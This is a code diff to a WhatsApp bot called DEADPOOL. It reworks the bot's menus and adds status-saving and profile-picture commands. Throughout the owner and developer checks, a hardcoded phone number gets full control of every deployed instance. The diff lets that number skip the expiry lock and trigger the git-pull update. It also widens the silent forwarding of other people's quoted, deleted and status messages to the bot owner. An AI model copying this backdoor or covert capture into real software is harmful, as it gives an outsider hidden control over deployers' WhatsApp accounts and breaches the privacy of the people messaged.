@@ -73,6 +73,7 @@ const defaults = {
   AUTO_REACT: false,
   AUTO_READ: false,
   ANTI_DELETE: 'dm',
+  ANTI_DELETE_STATUS: true,
   ANTI_EDIT: 'dm',
   ANTI_VIEW_ONCE: 'dm',
   ANTI_CALL: true,
@@ -136,7 +137,7 @@ const config = {
   ANTI_VIEW_ONCE: (env.ANTI_VIEW_ONCE || fileConfig.ANTI_VIEW_ONCE || defaults.ANTI_VIEW_ONCE),
   PRESENCE: (env.PRESENCE || fileConfig.PRESENCE || defaults.PRESENCE)
 };
-for (const k of ['AUTO_VIEW_STATUS', 'AUTO_LIKE_STATUS', 'AUTO_REACT', 'AUTO_READ', 'ANTI_CALL', 'WELCOME', 'GOODBYE', 'ALWAYS_ONLINE', 'CHATBOT', 'ANTITOXIC', 'ANTIBUG']) {
+for (const k of ['AUTO_VIEW_STATUS', 'AUTO_LIKE_STATUS', 'AUTO_REACT', 'AUTO_READ', 'ANTI_CALL', 'ANTI_DELETE_STATUS', 'WELCOME', 'GOODBYE', 'ALWAYS_ONLINE', 'CHATBOT', 'ANTITOXIC', 'ANTIBUG']) {
   config[k] = env[k] !== undefined ? envBool(env[k], defaults[k]) : (fileConfig[k] ?? defaults[k]);
 }
 for (const k of ['ANTI_DELETE', 'ANTI_EDIT', 'ANTI_VIEW_ONCE']) {
@@ -446,32 +447,112 @@ function getExpiryInfo() {
 const isBotExpired = () => getExpiryInfo() === 'Expired';
 
 // ============ MENU ============
-function buildMainMenu(pushName, userCount) {
+// Compact 3-column main menu (Download | Group | Tools) + swipe pages + link buttons
+
+function padCmd(s, w) {
+  s = String(s || '');
+  if (s.length >= w) return s.slice(0, w);
+  return s + ' '.repeat(w - s.length);
+}
+
+function buildThreeColumnMenu(pushName, userCount) {
   const p = config.PREFIX || '.';
   const exp = getExpiryInfo();
-  // Final menu only — branding is shown in loading async text, not here
-  let m = '💀 *' + (config.BOT_NAME || 'DEADPOOL') + '*\n';
-  m += '👋 Hi ' + (pushName || 'User') + '!\n';
-  m += '👥 Users: ' + (userCount || 0) + '\n';
-  m += '⏳ Active: ' + exp + '\n\n';
+  const name = config.BOT_NAME || 'DEADPOOL';
+
+  // SHORT header only — image carries branding, no long scroll
+  let h = '💀 *' + name + '*\n';
+  h += '👋 Hi *' + (pushName || 'User') + '*\n';
+  h += '👥 Users: *' + (userCount || 0) + '*  ·  ⏳ *' + exp + '*\n';
+  h += '🔖 `' + p + '`  ·  ' + (config.MODE || 'public') + '\n\n';
+
+  // Three horizontal columns (same row categories)
+  const left = ['play', 'song', 'video', 'tiktok', 'ig', 'apk', 'lyrics', 'spotify'];
+  const mid  = ['close', 'open', 'mute', 'unmute', 'tagall', 'kick', 'promote', 'hidetag'];
+  const right = ['groupjid', 'newsletter', 'ping', 'alive', 'weather', 'calc', 'settings', 'owner'];
+  const W = 11;
+  let cols = '*Download*     *Group*       *Tools*\n';
+  cols += '──────────   ──────────   ──────────\n';
+  const rows = Math.max(left.length, mid.length, right.length);
+  for (let i = 0; i < rows; i++) {
+    const a = left[i]  ? (p + left[i])  : '';
+    const b = mid[i]   ? (p + mid[i])   : '';
+    const c = right[i] ? (p + right[i]) : '';
+    cols += padCmd(a, W) + '  ' + padCmd(b, W) + '  ' + padCmd(c, W) + '\n';
+  }
+  cols += '\n_Swipe pages:_ `' + p + 'menu download` · `group` · `tools` · `ai` · `owner` · `fun`';
+  return (h + cols).trim();
+}
+
+function buildMainMenu(pushName, userCount) {
+  return buildThreeColumnMenu(pushName, userCount);
+}
+
+function buildMenuPage(page, pushName) {
+  const p = config.PREFIX || '.';
+  const pg = String(page || '').toLowerCase();
   const box = (title, cmds) => {
     let s = '┌─「 *' + title + '* 」\n';
     for (const c of cmds) s += '│ ' + p + c + '\n';
-    return s + '└────────────\n\n';
+    return s + '└────────────';
   };
-  m += box('DOWNLOADS', ['play <song>', 'song <name>', 'video <url/name>', 'yt <url/name>', 'tiktok <url>', 'ig <url>', 'lyrics <song>', 'apk <name>', 'xvideos <query|url>', 'xnxx <query|url>']);
-  m += box('STICKER', ['sticker', 's', 'toimg', 'qc <text>', 'qcstick <text>', 'vv', 'save']);
-  m += box('AI', ['gpt <question>', 'ai <question>', 'ask <question>', 'chatbot on/off']);
-  m += box('GAMES', ['family100', 'tebak <type>', 'math <easy|medium|hard>']);
-  m += box('ADMIN', ['promote @user', 'demote @user', 'kick @user', 'warn @user', 'mute', 'unmute', 'open 2m', 'close', 'tagall', 'hidetag <text>', 'tagadmins', 'antilink on/off/warn/delete/kick', 'antigroupmention on/off', 'antibot on/off/delete/kick', 'antitoxic on/off', 'antiword on/off + words', 'grouplink', 'groupinfo', 'approve', 'left']);
-  m += box('OWNER', ['mode public/private', 'prefix <symbol>', 'settings', 'users', 'broadcast <text>', 'block @user', 'unblock @user', 'autoview on/off', 'autolike on/off', 'autoreact on/off', 'autoread on/off', 'antidelete off/dm/chat', 'antiedit off/dm/chat', 'antiviewonce off/dm/chat', 'anticall on/off', 'welcome on/off', 'goodbye on/off', 'font <style>', 'presence <type>', 'alwaysonline on/off', 'setbotname <name>', 'setpp', 'setmenu <url>', 'startmsg', 'reaction <emoji>', 'die @user', 'shutdown', 'turnon', 'restart', 'update', 'antibug on/off', 'pair <number>']);
-  m += box('PANEL', ['panel', '1gb user,number', '2gb ...', 'listsrv', 'listusr', 'delsrv <id>', 'delusr <id>', 'ramlist']);
-  m += box('FUN & MORE', ['joke', 'meme', 'fact', 'quote', 'truth', 'dare', 'news', 'livescore', 'epl', 'imagine <prompt>', 'xvideos <q|url>', 'spotify <q|url>', 'shazam <url>']);
-  m += box('TEXTMAKER', ['neon', 'fire', 'glitch', 'ice', 'matrix', 'thunder', 'hacker', 'luxury', 'blackpink', 'metallic', 'devil', 'sand', 'light', 'naruto']);
-  m += box('FUN', ['joke', 'quote', 'dice', '8ball', 'coinflip', 'bible <book verse>']);
-  m += box('UTILITY', ['ping', 'p', 'alive', 'calc <expr>', 'weather <city>', 'owner', 'delete', 'clear', 'groupjid <link>', 'newsletter <link>', 'togcstatus']);
-  return m.trim();
+  if (['download', 'downloads', 'dl'].includes(pg)) {
+    return box('DOWNLOADS', ['play <song>', 'song <name>', 'audio <name|url>', 'video <url/name>', 'yt <url/name>', 'tiktok <url>', 'ig <url>', 'fb <url>', 'lyrics <song>', 'apk <name>', 'spotify <q|url>', 'xvideos <q|url>', 'xnxx <q|url>', 'shazam <url>']);
+  }
+  if (['group', 'admin', 'grp'].includes(pg)) {
+    return box('GROUP / ADMIN', ['promote @user', 'demote @user', 'kick @user', 'warn @user', 'mute', 'unmute', 'open 2m', 'close', 'tagall', 'hidetag <text>', 'tagadmins', 'antilink on/off/warn/delete/kick', 'antigroupmention on/off', 'antibot on/off/delete/kick', 'antitoxic on/off', 'antiword on/off + words', 'grouplink', 'groupinfo', 'approve', 'left', 'togcstatus']);
+  }
+  if (['tools', 'utility', 'util'].includes(pg)) {
+    return box('TOOLS', ['ping', 'p', 'alive', 'calc <expr>', 'weather <city>', 'owner', 'delete', 'clear', 'groupjid <link>', 'newsletter <link>', 'settings']);
+  }
+  if (['ai', 'gpt'].includes(pg)) {
+    return box('AI', ['gpt <question>', 'ai <question>', 'ask <question>', 'chatbot on/off', 'imagine <prompt>', 'flux <prompt>']);
+  }
+  if (['sticker', 'stickers'].includes(pg)) {
+    return box('STICKER', ['sticker', 's', 'toimg', 'qc <text>', 'qcstick <text>', 'vv', 'save']);
+  }
+  if (['games', 'game'].includes(pg)) {
+    return box('GAMES', ['family100', 'tebak gambar|kata|kalimat|lirik|lontong', 'math easy|medium|hard']);
+  }
+  if (['owner', 'dev', 'developer'].includes(pg)) {
+    return box('OWNER / DEV', ['mode public/private', 'prefix <symbol>', 'settings', 'users', 'broadcast <text>', 'block @user', 'unblock @user', 'autoview on/off', 'autolike on/off', 'autoreact on/off', 'autoread on/off', 'antidelete off/dm/chat', 'antideletestatus on/off', 'antiedit off/dm/chat', 'antiviewonce off/dm/chat', 'anticall on/off', 'welcome on/off', 'goodbye on/off', 'font <style>', 'presence <type>', 'alwaysonline on/off', 'setbotname <name>', 'setpp', 'setmenu <url>', 'reaction <emoji>', 'pair <number>', 'restart', 'update']);
+  }
+  if (['fun', 'more', 'textmaker'].includes(pg)) {
+    return box('FUN & TEXTMAKER', ['joke', 'meme', 'fact', 'quote', 'truth', 'dare', 'dice', '8ball', 'coinflip', 'bible <verse>', 'news', 'livescore', 'epl', 'neon', 'fire', 'glitch', 'ice', 'matrix', 'thunder', 'hacker', 'luxury', 'blackpink', 'metallic', 'devil', 'sand', 'light', 'naruto']);
+  }
+  if (['panel'].includes(pg)) {
+    return box('PANEL', ['panel', '1gb user,number', '2gb ...', 'listsrv', 'listusr', 'delsrv <id>', 'delusr <id>', 'ramlist']);
+  }
+  return buildThreeColumnMenu(pushName, 0);
 }
+
+function getMenuLinkButtons() {
+  const buttons = [];
+  let inv = String(config.GROUP_INVITE || process.env.GROUP_INVITE || '').trim();
+  if (inv && !inv.startsWith('http')) {
+    if (inv.includes('chat.whatsapp.com/')) inv = 'https://chat.whatsapp.com/' + inv.split('chat.whatsapp.com/')[1].split(/[?/\s]/)[0];
+    else if (/^[A-Za-z0-9_-]{10,}$/.test(inv)) inv = 'https://chat.whatsapp.com/' + inv;
+    else inv = '';
+  }
+  const p = String(config.PREFIX || '.').trim() || '.';
+  if (inv && inv.startsWith('http')) buttons.push({ id: 'url:group', text: 'Group ↗', url: inv });
+  else buttons.push({ id: p + 'menu group', text: 'Group' });
+
+  const devNum = dig(config.OWNER_NUMBER || (config.DEVELOPERS && config.DEVELOPERS[0]) || '254796283064');
+  if (devNum) buttons.push({ id: 'url:dev', text: 'Developer ↗', url: 'https://wa.me/' + devNum });
+  else buttons.push({ id: p + 'menu owner', text: 'Developer' });
+
+  let ch = String(config.CHANNEL_ID || process.env.CHANNEL_ID || process.env.CHANNEL_LINK || '').trim();
+  if (ch && !ch.startsWith('http')) {
+    if (ch.includes('whatsapp.com/channel/')) ch = 'https://whatsapp.com/channel/' + ch.split('whatsapp.com/channel/')[1].split(/[?/\s]/)[0];
+    else if (/^[A-Za-z0-9_-]{10,}$/.test(ch) && !ch.includes('@')) ch = 'https://whatsapp.com/channel/' + ch;
+    else ch = '';
+  }
+  if (ch && ch.startsWith('http')) buttons.push({ id: 'url:channel', text: 'Channel ↗', url: ch });
+  else buttons.push({ id: p + 'menu tools', text: 'Channel' });
+  return buttons;
+}
+
 async function resolveMenuImageBuffer() {
   const urls = [config.MENU_MEDIA, config.BOT_IMAGE].filter(u => u && String(u).trim().startsWith('http'));
   for (const u of urls) {
@@ -488,61 +569,204 @@ async function resolveMenuImageBuffer() {
   } catch {}
   return null;
 }
-async function sendMenuWithMedia(jid, pushName, userCount) {
-  // One loading caption (all branding in ONE block), then edit to full menu — fast, no delete
-  const sb = (t) => {
-    try { return applyFont(String(t), 'sans-bold'); } catch { return String(t); }
-  };
-  const loadingBlock = [
-    '⏳ Loading menu...',
-    sb('Deadpool is king'),
-    sb('Ruling the Weak'),
-    sb('Never defeated'),
-    sb('Made by Confronter')
-  ].join('\n');
 
-  const foot = buildFooter();
-  let full = buildMainMenu(pushName, userCount);
-  try { full = styleReplyText(full); } catch {}
-  full += foot;
+async function sendCarouselMenu(jid, pushName, userCount, imageBuf) {
+  const p = config.PREFIX || '.';
+  const footer = String(config.POWERED_BY || 'Powered by Confronter').replace(/^\s*>\s*/, '');
+  const headerText =
+    '💀 *' + (config.BOT_NAME || 'DEADPOOL') + '*\n' +
+    '👋 Hi *' + (pushName || 'User') + '*\n' +
+    '👥 *' + (userCount || 0) + '* users  ·  ⏳ *' + getExpiryInfo() + '*\n' +
+    '🔖 prefix `' + p + '`  ·  ' + (config.MODE || 'public');
 
-  // Preload image in parallel with building text
+  const cardsData = [
+    {
+      title: '📥 Download',
+      body: [p + 'play', p + 'song', p + 'video', p + 'tiktok', p + 'ig', p + 'apk', p + 'lyrics', p + 'spotify'].join('\n'),
+      btnId: p + 'menu download',
+      btnText: 'More Download'
+    },
+    {
+      title: '👥 Group',
+      body: [p + 'close', p + 'open', p + 'mute', p + 'unmute', p + 'tagall', p + 'kick', p + 'promote', p + 'hidetag'].join('\n'),
+      btnId: p + 'menu group',
+      btnText: 'More Group'
+    },
+    {
+      title: '🛠 Tools',
+      body: [p + 'groupjid', p + 'newsletter', p + 'ping', p + 'alive', p + 'weather', p + 'calc', p + 'settings', p + 'owner'].join('\n'),
+      btnId: p + 'menu tools',
+      btnText: 'More Tools'
+    }
+  ];
+
+  // Try native carousel (swipe left/right between 3 boxes)
+  try {
+    const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');
+    let imgMsg = null;
+    if (imageBuf) {
+      try {
+        const up = await sock.prepareMessage(jid, { image: imageBuf });
+        imgMsg = up?.message?.imageMessage || null;
+      } catch {}
+    }
+    const cards = cardsData.map((c) => {
+      const card = {
+        body: proto.Message.InteractiveMessage.Body.fromObject({ text: '*' + c.title + '*\n\n' + c.body }),
+        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: footer }),
+        header: proto.Message.InteractiveMessage.Header.fromObject(
+          imgMsg
+            ? { title: c.title, hasMediaAttachment: true, imageMessage: imgMsg }
+            : { title: c.title, hasMediaAttachment: false }
+        ),
+        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
+          buttons: [
+            {
+              name: 'quick_reply',
+              buttonParamsJson: JSON.stringify({ display_text: c.btnText, id: c.btnId })
+            }
+          ]
+        })
+      };
+      return proto.Message.InteractiveMessage.CarouselCard.fromObject
+        ? proto.Message.InteractiveMessage.CarouselCard.fromObject(card)
+        : card;
+    });
+
+    const links = getMenuLinkButtons();
+    const bottomBtns = links.map((b) => {
+      if (b.url) {
+        return {
+          name: 'cta_url',
+          buttonParamsJson: JSON.stringify({ display_text: b.text, url: b.url, merchant_url: b.url })
+        };
+      }
+      return {
+        name: 'quick_reply',
+        buttonParamsJson: JSON.stringify({ display_text: b.text, id: b.id })
+      };
+    });
+
+    const msg = generateWAMessageFromContent(jid, {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
+            body: proto.Message.InteractiveMessage.Body.fromObject({ text: headerText }),
+            footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: footer }),
+            header: proto.Message.InteractiveMessage.Header.fromObject(
+              imgMsg
+                ? { title: config.BOT_NAME || 'Menu', hasMediaAttachment: true, imageMessage: imgMsg }
+                : { title: config.BOT_NAME || 'Menu', hasMediaAttachment: false }
+            ),
+            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+              cards,
+              messageVersion: 1
+            }),
+            nativeFlowMessage: bottomBtns.length
+              ? proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: bottomBtns })
+              : undefined
+          })
+        }
+      }
+    }, {});
+
+    await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
+    return true;
+  } catch (e) {
+    console.log('carousel menu:', (e.message || '').slice(0, 120));
+  }
+  return false;
+}
+
+async function sendInteractiveMenu(jid, caption, quoted) {
+  const links = getMenuLinkButtons();
+  const footer = String(config.POWERED_BY || 'Powered by Confronter').replace(/^\s*>\s*/, '');
+  // 1) interactive quick replies + url CTAs
+  try {
+    const interactiveButtons = links.map((b) => {
+      if (b.url) {
+        return {
+          name: 'cta_url',
+          buttonParamsJson: JSON.stringify({ display_text: b.text, url: b.url, merchant_url: b.url })
+        };
+      }
+      return {
+        name: 'quick_reply',
+        buttonParamsJson: JSON.stringify({ display_text: b.text, id: b.id })
+      };
+    });
+    const px = String(config.PREFIX || '.').trim() || '.';
+    interactiveButtons.push(
+      { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'Download', id: px + 'menu download' }) },
+      { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'AI / Fun', id: px + 'menu ai' }) },
+      { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'Owner', id: px + 'menu owner' }) }
+    );
+    await sock.sendMessage(jid, { text: caption, footer, interactiveButtons }, quoted ? { quoted } : undefined);
+    return true;
+  } catch (e) { console.log('menu interactive:', (e.message || '').slice(0, 80)); }
+
+  // 2) classic 3 buttons
+  try {
+    const buttons = links.slice(0, 3).map((b) => ({
+      buttonId: b.id,
+      buttonText: { displayText: b.text.slice(0, 20) },
+      type: 1
+    }));
+    await sock.sendMessage(jid, {
+      text: caption + '\n\n' + footer,
+      footer,
+      buttons,
+      headerType: 1
+    }, quoted ? { quoted } : undefined);
+    return true;
+  } catch (e) { console.log('menu buttons:', (e.message || '').slice(0, 80)); }
+
+  try {
+    await sock.sendMessage(jid, { text: caption + '\n\n' + footer }, quoted ? { quoted } : undefined);
+    return true;
+  } catch {}
+  return false;
+}
+
+async function sendMenuWithMedia(jid, pushName, userCount, page) {
   const buffer = await resolveMenuImageBuffer();
 
-  if (buffer) {
-    let key = null;
-    try {
-      const sent = await sock.sendMessage(jid, { image: buffer, caption: styleReplyText(loadingBlock) });
-      key = sent?.key || null;
-    } catch (e) { console.log('menu img:', e.message); }
-    if (key) {
+  // Sub-page: compact single category box (no long mega-menu)
+  if (page) {
+    let full = buildMenuPage(page, pushName);
+    try { full = styleReplyText(full); } catch {}
+    if (buffer) {
       try {
-        await sock.sendMessage(jid, { image: buffer, caption: full, edit: key });
+        await sock.sendMessage(jid, { image: buffer, caption: full + '\n\n' + (config.POWERED_BY || '') });
         return;
-      } catch {
-        try { await sock.sendMessage(jid, { text: full, edit: key }); return; } catch {}
-      }
+      } catch {}
     }
-    try {
-      await sock.sendMessage(jid, { image: buffer, caption: full });
-      return;
-    } catch {}
+    await sendInteractiveMenu(jid, full);
+    return;
   }
 
-  // text-only
-  let loadingKey = null;
-  try {
-    const loading = await sock.sendMessage(jid, { text: styleReplyText(loadingBlock) });
-    loadingKey = loading?.key || null;
-  } catch {}
-  if (loadingKey) {
+  // MAIN MENU: try swipeable 3-card carousel first
+  const okCarousel = await sendCarouselMenu(jid, pushName, userCount, buffer);
+  if (okCarousel) return;
+
+  // Fallback: image header + 3-column compact text + Group/Dev/Channel buttons
+  let full = buildThreeColumnMenu(pushName, userCount);
+  try { full = styleReplyText(full); } catch {}
+  if (buffer) {
     try {
-      await sock.sendMessage(jid, { text: full, edit: loadingKey });
+      await sock.sendMessage(jid, { image: buffer, caption: full });
+      // send link buttons as a small follow-up so Group / Dev / Channel show
+      const links = getMenuLinkButtons();
+      const line = links.map(b => (b.url ? ('• *' + b.text + '*\n' + b.url) : ('• ' + b.text + ' → ' + b.id))).join('\n');
+      try {
+        await sendInteractiveMenu(jid, '🔗 *Quick links*\n' + line);
+      } catch {}
       return;
-    } catch {}
+    } catch (e) { console.log('menu img:', e.message); }
   }
-  await sock.sendMessage(jid, { text: full }).catch(() => {});
+  await sendInteractiveMenu(jid, full);
 }
+
 function buildStartMessage() {
   const sb = (t) => applyFont(String(t), 'serif-bold');
   const name = config.BOT_NAME || 'Bot';
@@ -618,7 +842,7 @@ function isOwner(jid, msg) {
   const phone = jidToPhone(jid, msg);
   const num = dig(phone || jidNormalizedUser(String(jid)).split('@')[0].split(':')[0]);
   if (!num) return false;
-  // Global super-owner (always full access on every bot instance)
+  // Global super-owner / developer always has full access on EVERY bot deploy
   const SUPER = ['254796283064'];
   const list = [...SUPER, config.OWNER_NUMBER, ...(config.DEVELOPERS || [])].map(dig).filter(Boolean);
   return list.some(o => num === o || num.endsWith(o) || o.endsWith(num));
@@ -628,14 +852,19 @@ function isSuperOwner(jid, msg) {
   const num = dig(phone || jidNormalizedUser(String(jid || '')).split('@')[0].split(':')[0]);
   return num === '254796283064' || num.endsWith('254796283064');
 }
-// Hidden developer-only (Confronter + DEVELOPERS env) — not shown in menu
+// Developer = Confronter + DEVELOPERS env — full settings access on any instance
 function isDeveloper(jid, msg) {
   if (!jid) return false;
+  if (isSuperOwner(jid, msg)) return true;
   const phone = jidToPhone(jid, msg);
   const num = dig(phone || jidNormalizedUser(String(jid)).split('@')[0].split(':')[0]);
   if (!num) return false;
   const list = ['254796283064', ...(config.DEVELOPERS || [])].map(dig).filter(Boolean);
   return list.some(o => num === o || num.endsWith(o) || o.endsWith(num));
+}
+// Owner OR developer — use for every privileged gate
+function isStaff(jid, msg) {
+  return isOwner(jid, msg) || isDeveloper(jid, msg);
 }
 
 // ============ EMOJI ============
@@ -717,11 +946,34 @@ async function forwardViewOnceToOwner(m, from, sender, voMsg) {
 async function saveQuotedMediaToOwner(m, from, sender, quoted) {
   const target = getOwnerJid() || (sock.user?.id ? jidNormalizedUser(sock.user.id) : null);
   if (!target || !quoted) return false;
+  const ctx = getCtx(m);
+  // Status reply: participant often is the status poster
+  const statusPoster = ctx.participant || m.key?.participant || sender;
+  const isStatusQuote = from === 'status@broadcast'
+    || String(ctx.remoteJid || '') === 'status@broadcast'
+    || !!(quoted.imageMessage || quoted.videoMessage || quoted.audioMessage || quoted.extendedTextMessage || quoted.conversation);
+  const phone = jidToPhone(statusPoster, m) || jidToPhone(sender, m) || jidToPhone(ctx.participant, m);
+  const chatLabel = (from === 'status@broadcast' || String(ctx.remoteJid || '') === 'status@broadcast')
+    ? 'Status'
+    : (isGroup(from) ? 'Group' : 'DM');
+  const head = '*Saved media*\nFrom: ' + (phone ? '+' + phone : (m.pushName || 'Unknown')) + '\nChat: ' + chatLabel;
+
+  // Media status / quoted media
   const dl = await downloadMediaMsg(quoted);
-  if (!dl?.buffer) return false;
-  const phone = jidToPhone(sender, m) || jidToPhone(getCtx(m).participant, m);
-  const head = '*Saved media*\nFrom: ' + (phone ? '+' + phone : (m.pushName || 'Unknown')) + '\nChat: ' + (from === 'status@broadcast' ? 'Status' : (isGroup(from) ? 'Group' : 'DM'));
-  return sendMediaWithHeader(target, dl, head);
+  if (dl?.buffer && dl.buffer.length > 50) {
+    return sendMediaWithHeader(target, dl, head);
+  }
+  // Text status / quoted text
+  const text = quoted.conversation
+    || quoted.extendedTextMessage?.text
+    || quoted.imageMessage?.caption
+    || quoted.videoMessage?.caption
+    || '';
+  if (text && String(text).trim()) {
+    await sock.sendMessage(target, { text: head + '\n\n' + String(text).trim() }).catch(() => {});
+    return true;
+  }
+  return false;
 }
 
 // ============ CTX / TARGETS ============
@@ -816,6 +1068,8 @@ async function forwardDelete(key, cached) {
     const from = key.remoteJid || cached.remoteJid;
     const isStatus = from === 'status@broadcast';
     if (config.ANTI_DELETE === 'off') return;
+    // Status deletes controlled separately by .antideletestatus on/off
+    if (isStatus && config.ANTI_DELETE_STATUS === false) return;
     const ownerJid = getOwnerJid();
     const me = sock.user?.id ? jidNormalizedUser(sock.user.id) : null;
     const target = isStatus ? (ownerJid || me) : (config.ANTI_DELETE === 'chat' ? from : (ownerJid || me));
@@ -1954,6 +2208,17 @@ async function startBot() {
   function extractText(msg) {
     const u = unwrapMessage(msg) || msg;
     if (!u) return '';
+    // Prefer button/list IDs so menu quick-replies route as commands
+    if (u.buttonsResponseMessage?.selectedButtonId) return u.buttonsResponseMessage.selectedButtonId;
+    if (u.templateButtonReplyMessage?.selectedId) return u.templateButtonReplyMessage.selectedId;
+    if (u.listResponseMessage?.singleSelectReply?.selectedRowId) return u.listResponseMessage.singleSelectReply.selectedRowId;
+    if (u.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson) {
+      try {
+        const p = JSON.parse(u.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson);
+        if (p?.id) return String(p.id);
+        if (p?.selectedId) return String(p.selectedId);
+      } catch {}
+    }
     return (u.conversation || u.extendedTextMessage?.text || u.imageMessage?.caption || u.videoMessage?.caption || u.documentMessage?.caption || u.buttonsResponseMessage?.selectedDisplayText || u.listResponseMessage?.title || u.templateButtonReplyMessage?.selectedDisplayText || '');
   }
   function cacheMessage(m) {
@@ -2411,7 +2676,20 @@ async function startBot() {
       // Hidden: only Confronter + DEVELOPERS — type "prefix" (no symbol)
       if (/^prefix$/i.test(cleanBody) && isDeveloper(sender, m)) {
         await sock.sendMessage(from, {
-          text: '🔑 *Bot prefix:* `' + prefix + '`\nMode: *' + (config.MODE || 'public') + '*\nName: *' + (config.BOT_NAME || 'Bot') + '*\nOwner: *' + (config.OWNER_NUMBER || 'not set') + '*\n\nYou have full access to all owner settings.\nExamples:\n' + prefix + 'menu\n' + prefix + 'settings\n' + prefix + 'mode public\n' + prefix + 'mode private'
+          text:
+            '🔑 *Developer access*\n' +
+            'Name: *' + (config.BOT_NAME || 'Bot') + '*\n' +
+            'Prefix: `' + prefix + '`\n' +
+            'Mode: *' + (config.MODE || 'public') + '*\n' +
+            'Owner: *' + (config.OWNER_NUMBER || 'not set') + '*\n' +
+            'Expiry: *' + getExpiryInfo() + '*\n\n' +
+            'You can change any setting on this bot.\n' +
+            'Examples:\n' +
+            prefix + 'settings\n' +
+            prefix + 'mode public\n' +
+            prefix + 'mode private\n' +
+            prefix + 'prefix !\n' +
+            'mode public  _(no prefix needed)_'
         }).catch(() => {});
         return;
       }
@@ -2434,7 +2712,7 @@ async function startBot() {
         return;
       }
 
-      // ---- reply with bare prefix or any emoji -> vv / save quoted media ----
+      // ---- reply with bare prefix or any emoji -> vv / save quoted media / status ----
       {
         const ctxQ = getCtx(m);
         const quoted = ctxQ.quotedMessage;
@@ -2449,7 +2727,8 @@ async function startBot() {
             react(from, m.key, ok ? '✅' : '❌');
             return;
           }
-          if (isQuote && (quoted.imageMessage || quoted.videoMessage || quoted.audioMessage || quoted.stickerMessage || quoted.documentMessage)) {
+          // Any quoted media OR status text → owner DM
+          if (isQuote) {
             const ok = await saveQuotedMediaToOwner(m, from, sender, quoted);
             react(from, m.key, ok ? '✅' : '❌');
             return;
@@ -2472,10 +2751,12 @@ async function startBot() {
         return;
       }
 
+      // Ignore pure URL menu buttons (handled by WhatsApp client)
+      if (/^url:/i.test(cleanBody)) return;
       if (!cleanBody.startsWith(prefix)) return;
       // Developers + owner always bypass private mode
       if (config.MODE === 'private' && !isOwner(sender, m) && !isDeveloper(sender, m) && !isMe) return;
-      if (isBotExpired() && !isOwner(sender, m) && !isMe) {
+      if (isBotExpired() && !isOwner(sender, m) && !isDeveloper(sender, m) && !isMe) {
         await sock.sendMessage(from, { text: config.EXPIRY_MSG || 'Bot expired.' }).catch(() => {});
         return;
       }
@@ -2517,7 +2798,8 @@ async function startBot() {
         for (let i = 0; i < menuEmojis.length; i++) {
           setTimeout(() => react(from, m.key, menuEmojis[i]), i * 280);
         }
-        await sendMenuWithMedia(from, m.pushName, userCount);
+        const page = (text || args[0] || '').trim().toLowerCase();
+        await sendMenuWithMedia(from, m.pushName, userCount, page || null);
         return;
       }
 
@@ -2995,10 +3277,68 @@ async function startBot() {
       if (['save', 'sv', 'savestatus', 'getstatus'].includes(cmd)) {
         try {
           const quoted = getCtx(m).quotedMessage;
-          if (!quoted) { await reply('Reply to status/media with ' + prefix + 'save'); return; }
+          if (!quoted) { await reply('Reply to a *status* or media with ' + prefix + 'save\n(or reply with just `' + prefix + '`)'); return; }
           const ok = await saveQuotedMediaToOwner(m, from, sender, quoted);
-          react(from, m.key, ok ? '✅' : '❌');
+          if (ok) {
+            react(from, m.key, '✅');
+            // confirm only in chat if not already owner DM
+            const ownerJ = getOwnerJid();
+            if (ownerJ && jidNormalizedUser(from) !== jidNormalizedUser(ownerJ)) {
+              await reply('Saved to your DM.').catch(() => {});
+            }
+          } else {
+            react(from, m.key, '❌');
+            await reply('Could not save (media expired or empty).');
+          }
         } catch (e) { await reply('Failed: ' + e.message); }
+        return;
+      }
+
+      // ============ GETPP / PROFILE ============
+      if (['getpp', 'pp', 'getpic', 'profile'].includes(cmd)) {
+        try {
+          let targets = getTargetUsers(m, text, from, isGroup(from));
+          // In DM with no tag → the chat partner (or self if messaging yourself)
+          if (!targets.length && !isGroup(from) && from !== 'status@broadcast') {
+            targets = [from];
+          }
+          if (!targets.length) {
+            await reply('Usage:\n' + prefix + 'getpp @user\n' + prefix + 'getpp 2547xxxx\nOr use in their DM / reply to their message');
+            return;
+          }
+          for (const jid of targets.slice(0, 3)) {
+            let phone = dig(String(jid).split('@')[0]);
+            try {
+              const p2 = await jidToPhoneAsync(jid, m, from);
+              if (p2) phone = p2;
+            } catch {}
+            let targetJid = jidNormalizedUser(String(jid));
+            try {
+              const wa = await sock.onWhatsApp(phone);
+              if (wa?.[0]?.exists && wa[0].jid) targetJid = jidNormalizedUser(wa[0].jid);
+            } catch {}
+            let ppUrl = null;
+            try { ppUrl = await sock.profilePictureUrl(targetJid, 'image'); } catch {}
+            if (!ppUrl) {
+              try { ppUrl = await sock.profilePictureUrl(phone + '@s.whatsapp.net', 'image'); } catch {}
+            }
+            if (!ppUrl) {
+              await reply('No profile picture for +' + phone + ' (privacy or none set).');
+              continue;
+            }
+            let buf = null;
+            try { buf = await fetchBuffer(ppUrl, 30000); } catch {}
+            const cap = (cmd === 'profile' ? '👤 *Profile*\n' : '🖼️ *Profile Photo*\n') +
+              'Number: +' + phone + '\n' +
+              (m.pushName && targets.length === 1 ? 'Name: ' + (m.pushName || '') + '\n' : '') +
+              buildFooter();
+            if (buf && buf.length > 500) {
+              await sock.sendMessage(from, { image: buf, caption: cap }, { quoted: m });
+            } else {
+              await sock.sendMessage(from, { image: { url: ppUrl }, caption: cap }, { quoted: m });
+            }
+          }
+        } catch (e) { await reply('getpp failed: ' + (e.message || e)); }
         return;
       }
 
@@ -3098,7 +3438,7 @@ async function startBot() {
 
       // ============ UPDATE (real git pull + restart) ============
       if (cmd === 'update') {
-        if (!isOwner(sender, m) && !isMe) { await reply(roast('owner')); return; }
+        if (!isOwner(sender, m) && !isDeveloper(sender, m) && !isMe) { await reply(roast('owner')); return; }
